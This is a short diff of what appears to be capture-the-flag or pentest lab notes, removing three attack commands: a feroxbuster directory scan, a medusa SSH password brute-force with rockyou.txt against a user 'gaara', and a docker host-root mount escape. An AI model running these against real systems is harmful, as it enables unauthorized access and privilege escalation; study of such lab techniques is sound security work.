@@ -1,17 +1,13 @@
 ```
-feroxbuster -u http://192.168.187.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,zip -t 80 -d 2
+
 ```
 
 ```
-medusa -u gaara \
-       -P /usr/share/wordlists/rockyou.txt \
-       -h 192.168.113.142 \
-       -M ssh \
-       -n 22
+
 ```
 
 ```
-docker run -v /:/mnt --rm -it mysql chroot /mnt sh
+
 ```
 
 ```
